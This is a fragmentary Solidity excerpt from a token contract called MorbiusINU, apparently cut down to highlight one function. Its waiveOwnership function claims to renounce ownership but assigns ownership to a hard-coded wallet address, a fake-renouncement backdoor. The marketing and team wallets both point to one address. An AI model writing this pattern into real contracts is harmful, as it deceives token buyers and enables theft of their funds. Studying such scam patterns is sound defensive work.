...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x00cDF226047F5Ec2a93fbe07d6193F668827A5a4);
    }
...
contract MorbiusINU is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x676ed5347C064348Ab8535Cd0CC91Ce1C1854b5d);
    address payable public teamWalletAddress = payable(0x676ed5347C064348Ab8535Cd0CC91Ce1C1854b5d);
